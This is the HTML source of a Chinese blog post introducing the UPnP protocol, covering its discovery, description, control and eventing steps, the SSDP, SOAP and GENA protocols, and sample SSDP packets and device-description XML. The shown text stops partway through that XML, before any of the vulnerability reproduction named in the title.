@@ -1,0 +1,974 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="GroundCtl2MajorTom">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="upnpupnp简介通用即插即用（英语：Universal Plug and Play，简称UPnP）是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议，主要用于设备的智能互联互通。 UPnP可以当作是一个相对复杂的网络协议，毕竟它包含了很多其他的网络协议，如：ip（设备寻址）、tcp、udp（数据打包发送）、http（数据传递格式）等。 UPnP可以扩展，也就是说还可以在启动加">
+<meta property="og:type" content="article">
+<meta property="og:title" content="upnp协议学习及漏洞复现">
+<meta property="og:url" content="http://groundctl2majortom.github.io/2024/08/14/upnp%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="GroundCtl2MajorTom">
+<meta property="og:description" content="upnpupnp简介通用即插即用（英语：Universal Plug and Play，简称UPnP）是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议，主要用于设备的智能互联互通。 UPnP可以当作是一个相对复杂的网络协议，毕竟它包含了很多其他的网络协议，如：ip（设备寻址）、tcp、udp（数据打包发送）、http（数据传递格式）等。 UPnP可以扩展，也就是说还可以在启动加">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/pnp-2.jpg">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/08/14/upnp%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240819211742105.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820022530260.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/08/14/upnp%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240820023504678.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820023548508.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820024349143.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820024556954.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820024921534.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820025058755.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820025241915.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240819235241968.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820005128933.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820012009328.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/08/14/upnp%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240820103700236.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/08/14/upnp%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240820014425461.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825194351354.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825200611537.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825193826718.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201519160.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201602517.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201705430.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201744480.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825202019245.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825202354671.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825202641697.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823134331890.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823134635202.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823134728002.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823130837246.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/08/14/upnp%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240823141840975.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/08/14/upnp%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240823143839889.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/08/14/upnp%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240823143953213.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823162755843.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823160953326.png">
+<meta property="article:published_time" content="2024-08-14T04:51:50.000Z">
+<meta property="article:modified_time" content="2024-09-04T06:59:10.455Z">
+<meta property="article:author" content="GroundCtl2MajorTom">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/pnp-2.jpg">
+  
+  
+  
+  <title>upnp协议学习及漏洞复现 - GroundCtl2MajorTom</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"groundctl2majortom.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>GroundCtl2majorTom</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="upnp协议学习及漏洞复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-14 12:51" pubdate>
+          2024年8月14日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          69 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">upnp协议学习及漏洞复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="upnp"><a href="#upnp" class="headerlink" title="upnp"></a>upnp</h4><h5 id="upnp简介"><a href="#upnp简介" class="headerlink" title="upnp简介"></a>upnp<strong>简介</strong></h5><p><strong>通用即插即用</strong>（英语：Universal Plug and Play，简称<strong>UPnP</strong>）是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议，主要用于设备的智能互联互通。</p>
+<p>UPnP可以当作是一个相对复杂的网络协议，毕竟它包含了很多其他的网络协议，如：ip（设备寻址）、tcp、udp（数据打包发送）、http（数据传递格式）等。</p>
+<p>UPnP可以扩展，也就是说还可以在启动加入其他的协议，比如：传递数据时，http协议再包一层json协议，或者数据传递使用xml协议来传递等等。</p>
+<p>UPnP之所以强大，很大一个原因是基于互联网，这样对等设备可以通过互联网自由交互，也就是说任何可以联网的设备都可以使用UPnP协议。</p>
+<p><strong>UPnP用法</strong></p>
+<h6 id="（1）寻址——Addressing"><a href="#（1）寻址——Addressing" class="headerlink" title="（1）寻址——Addressing"></a>（1）寻址——Addressing</h6><p>因为基于互联网，需要满足基本的p2p协议，所以就必须要寻址，寻址的过程就是设备获取ip地址的过程，这个里面一般都使用DHCP（Dynamic Host Configuration Protocol，动态主机配置协议），即路由动态的分配一个没有使用的ip地址给设备。</p>
+<h6 id="（2）发现——Discovery"><a href="#（2）发现——Discovery" class="headerlink" title="（2）发现——Discovery"></a>（2）发现——Discovery</h6><p>UPnP通过SSDP（简单服务发现协议）完成设备的发现。通过寻址拥有了身份标识IP，加入了互联网当中。新加入的设备向UPnP专用</p>
+<p>的组播地址（239.255.255.250:1900）发送消息宣告自己的存在。</p>
+<h6 id="（3）描述——Description"><a href="#（3）描述——Description" class="headerlink" title="（3）描述——Description"></a>（3）描述——Description</h6><p>在设备发现的过程中，设备描述文件的URL包含在设备加入网络</p>
+<p>时发送的消息中，也就是LOCATION中的描述url，通过location中的url能获取一个xml，一般设备的描述都是通过xml来标识的。</p>
+<h6 id="（4）控制——Control"><a href="#（4）控制——Control" class="headerlink" title="（4）控制——Control"></a>（4）控制——Control</h6><p>UPnP通过SOAP协议控制设备，按照XML描述文件中的信息，以</p>
+<p>Device（设备）+Service（设备的服务）+action（动作）+Variable</p>
+<p>（值）的形式控制设备。一个控制的过程包含控制地址、控制说明、控制执行、控制响应。</p>
+<h6 id="（5）事件——Eventing"><a href="#（5）事件——Eventing" class="headerlink" title="（5）事件——Eventing"></a>（5）事件——Eventing</h6><p>事件即设备的状态量发生了变化，需注册一个观察者。当状态量发生了变化时，设备会提示观察者状态量发生变化，并及时处理。</p>
+<h6 id="（6）展示——Presentation"><a href="#（6）展示——Presentation" class="headerlink" title="（6）展示——Presentation"></a>（6）展示——Presentation</h6><p>展示作为一个控制和事件的补充，实现upnp协议并不强制要求。</p>
+<h5 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h5><ol>
+<li><strong>自动发现</strong>：UPnP 允许设备在同一网络中通过广播和多播消息自动发现其他设备。例如，当一个新设备连接到网络时，它可以使用 SSDP（Simple Service Discovery Protocol）向其他设备发送通知。</li>
+<li><strong>即插即用</strong>：用户只需将设备连接到网络，无需手动配置或设置。设备能够自我描述其功能，并与其他设备进行交互。</li>
+<li><strong>跨平台支持</strong>：UPnP 设计为跨操作系统和设备类型工作，支持各种类型的设备，如打印机、路由器、智能家居设备、媒体播放器等。</li>
+<li><strong>灵活性和可扩展性</strong>：UPnP 支持多种类型的应用场景，包括家庭网络、企业网络以及广域网应用，使其具有很高的灵活性和可扩展性。</li>
+</ol>
+<h5 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h5><ol>
+<li><strong>设备发现</strong>：使用 SSDP，UPnP 设备能够通过网络广播其存在，其他设备可以接收这些广播以了解网络中可用的设备。</li>
+<li><strong>服务描述</strong>：发现设备后，其他设备可以请求该设备提供的服务的描述信息。设备使用 XML 文件来描述其服务、功能、事件和操作。</li>
+<li><strong>控制和管理</strong>：设备可以通过 HTTP 请求对其他设备进行控制和管理。UPnP 定义了一些标准的控制命令，允许设备之间进行交互。</li>
+<li><strong>事件通知</strong>：UPnP 设备可以发布事件通知，告知其他设备其状态或属性的变化。这使得设备能够保持同步并响应网络中的变化。</li>
+</ol>
+<h5 id="upnp工作在哪一层？"><a href="#upnp工作在哪一层？" class="headerlink" title="upnp工作在哪一层？"></a>upnp工作在哪一层？</h5><p>UPnP（Universal Plug and Play）协议主要工作在应用层，但它依赖于多个网络协议层来实现其功能。UPnP 的核心目标是使设备在网络上能够自动发现彼此并进行通信。下面是 UPnP 协议如何与不同网络层交互的简要说明：</p>
+<h6 id="1-应用层"><a href="#1-应用层" class="headerlink" title="1. 应用层"></a>1. <strong>应用层</strong></h6><ul>
+<li><strong>UPnP 的核心</strong>：UPnP 是一个应用层协议，旨在简化网络设备的自动发现和服务配置。它定义了设备如何在网络上自我描述以及如何提供服务。它包括一套 XML 描述和控制协议，使得设备能够在网络上公开它们的服务并让其他设备能够发现和使用这些服务。</li>
+<li><strong>服务描述</strong>：设备通过使用 XML 文件描述其服务、功能和能力，其他设备可以通过这些描述了解并使用这些服务。</li>
+</ul>
+<h6 id="2-传输层"><a href="#2-传输层" class="headerlink" title="2. 传输层"></a>2. <strong>传输层</strong></h6><ul>
+<li><strong>HTTP</strong>：UPnP 使用 HTTP 协议作为其控制协议的一部分。UPnP 设备通过 HTTP 请求来发现设备和服务、获取描述信息以及执行控制命令。这包括使用 HTTP 的 POST、GET 和 NOTIFY 方法来交换信息。</li>
+</ul>
+<h6 id="3-网络层"><a href="#3-网络层" class="headerlink" title="3. 网络层"></a>3. <strong>网络层</strong></h6><ul>
+<li><strong>SSDP（Simple Service Discovery Protocol）</strong>：为了进行设备和服务的发现，UPnP 使用 SSDP 协议，这是一种基于 UDP 的协议，工作在网络层。SSDP 允许设备通过广播消息来宣布它们的存在，并接收其他设备的发现请求。</li>
+</ul>
+<h6 id="4-数据链路层"><a href="#4-数据链路层" class="headerlink" title="4. 数据链路层"></a>4. <strong>数据链路层</strong></h6><ul>
+<li><strong>广播和多播</strong>：UPnP 的一些操作，如设备发现和服务发现，使用网络广播和多播技术。广播和多播是数据链路层的一部分，用于在本地网络上快速传播信息。</li>
+</ul>
+<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><ul>
+<li><strong>应用层</strong>：UPnP 协议本身是在应用层工作，处理设备发现、服务描述和控制。</li>
+<li><strong>传输层</strong>：利用 HTTP 协议进行数据传输和控制。</li>
+<li><strong>网络层</strong>：使用 SSDP 协议进行设备发现。</li>
+<li><strong>数据链路层</strong>：通过广播和多播技术在局域网中传播信息。</li>
+</ul>
+<p>UPnP 协议的设计和实施依赖于这些不同的层次来实现其自动发现和服务配置的功能。</p>
+<h5 id="GENA协议"><a href="#GENA协议" class="headerlink" title="GENA协议"></a>GENA协议</h5><p>通用事件通知架构（Generic Event Notification Architecture：GENA）定义在控制点想要监听设备的某个服务状态变量的状况时，控制点如何传送订阅信息并如何接收这些信息，该协议运用在UPnP工作流程的事件订阅部分。</p>
+<p><strong>借一张图如下：</strong></p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/pnp-2.jpg" srcset="/img/loading.gif" lazyload alt="upnp-2.jpg"></p>
+<p>1、 首先控制点和设备都先获取IP地址后才能进行下一步的工作(DHCP协议)；</p>
+<p>2、 控制点首先要寻找整个网络上的UPnP设备，同时网络上的设备也要宣告自身的存在；</p>
+<p>3、 控制点要取得设备的描述，包括这些设备提供什么样的服务；在控制点发现设备存活后，会立即访问<code>LOCATION</code>字段中的URL获得设备信息。</p>
+<p>4、 控制点发出动作信息给设备；</p>
+<p>5、 控制点监听设备的状态，当状态改变时作出相应的处理动作；</p>
+<h5 id="upnp整体协议及框架"><a href="#upnp整体协议及框架" class="headerlink" title="upnp整体协议及框架"></a>upnp整体协议及框架</h5><img src="image-20240819211742105.png" srcset="/img/loading.gif" lazyload alt="image-20240819211742105" style="zoom:33%;" />
+
+<h5 id="SSDP协议"><a href="#SSDP协议" class="headerlink" title="SSDP协议"></a>SSDP协议</h5><p>简单服务发现协议（Simple Service Discovery Protocol：SSDP），是内建在HTTPU&#x2F;HTTPMU里，定义如何让网络上有的服务被发现的协议。具体包括控制点如何发现网络上有哪些服务，以及这些服务的资讯，还有控制点本身宣告他提供哪些服务。该协议运用在UPnP工作流程的设备发现部分。</p>
+<h5 id="SOAP协议"><a href="#SOAP协议" class="headerlink" title="SOAP协议"></a>SOAP协议</h5><p>简单对象访问协议（Simple object Access Protocol：SOAP）定义如何使用xml与HTTP来执行远程过程调用（Remote Procedure Call）。包括控制点如何发送命令消息给设备，设备收到命令消息后如何发送响应消息给控制点。该协议运用在UPnP工作流程的设备控制部分。<strong>用来控制UPnP设备的统一消息格式，发送命令消息即可</strong></p>
+<h5 id="upnp数据包示例"><a href="#upnp数据包示例" class="headerlink" title="upnp数据包示例"></a>upnp数据包示例</h5><h6 id="1-SSDP（Simple-Service-Discovery-Protocol）"><a href="#1-SSDP（Simple-Service-Discovery-Protocol）" class="headerlink" title="1. SSDP（Simple Service Discovery Protocol）"></a>1. SSDP（Simple Service Discovery Protocol）</h6><p>SSDP 是 UPnP 中用于设备发现的协议。SSDP 数据包通常使用 UDP 进行广播。下面是一个 SSDP 请求的示例：</p>
+<p><strong>请求示例：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">M</span>-SEARCH * HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">HOST</span>: <span class="hljs-number">239.255.255.250:1900</span><br><span class="hljs-attribute">MAN</span>: <span class="hljs-string">&quot;ssdp:discover&quot;</span><br><span class="hljs-attribute">MX</span>: <span class="hljs-number">3</span><br><span class="hljs-attribute">ST</span>: ssdp:<span class="hljs-literal">all</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>HOST</strong>: 指定了目标地址和端口。</li>
+<li><strong>MAN</strong>: 表示这是一个发现请求。也经常是ssdp:all</li>
+<li><strong>MX</strong>: 表示响应的最大等待时间（秒）。</li>
+<li><strong>ST</strong>: 表示搜索目标，可以是特定服务或设备类型。</li>
+</ul>
+<p><strong>响应示例：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">CACHE</span>-CONTROL: max-age=<span class="hljs-number">1800</span><br><span class="hljs-attribute">DATE</span>: Sat, <span class="hljs-number">19</span> Aug <span class="hljs-number">2024</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT<br><span class="hljs-attribute">EXT</span>:<br><span class="hljs-attribute">LOCATION</span>: http://<span class="hljs-number">192.168.1.2:5000</span>/description.xml<br><span class="hljs-attribute">SERVER</span>: OS/version UPnP/<span class="hljs-number">1</span>.<span class="hljs-number">0</span> product/version<br><span class="hljs-attribute">ST</span>: urn:schemas-upnp-org:device:MediaRenderer:<span class="hljs-number">1</span><br><span class="hljs-attribute">USN</span>: uuid:<span class="hljs-number">12345678</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">5678</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">123456789</span>abc::urn:schemas-upnp-org:device:MediaRenderer:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>LOCATION</strong>: 提供了设备描述文件的 URL。</li>
+<li><strong>USN</strong>: 唯一服务名称，标识该设备的 UUID 和服务类型。</li>
+</ul>
+<h6 id="2-设备描述"><a href="#2-设备描述" class="headerlink" title="2. 设备描述"></a>2. 设备描述</h6><p>UPnP 设备通常通过 XML 文件描述其服务和功能。设备描述文件可以通过 SSDP 响应中的 LOCATION URL 获取。下面是一个简单的设备描述的示例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:device-1-0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">specVersion</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">major</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">major</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">minor</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">minor</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">specVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">device</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">deviceType</span>&gt;</span>urn:schemas-upnp-org:device:MediaRenderer:1<span class="hljs-tag">&lt;/<span class="hljs-name">deviceType</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">friendlyName</span>&gt;</span>My Media Renderer<span class="hljs-tag">&lt;/<span class="hljs-name">friendlyName</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">manufacturer</span>&gt;</span>My Company<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturer</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">modelName</span>&gt;</span>Renderer Model<span class="hljs-tag">&lt;/<span class="hljs-name">modelName</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">serviceList</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:Rendering:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:Rendering<span class="hljs-tag">&lt;/<span 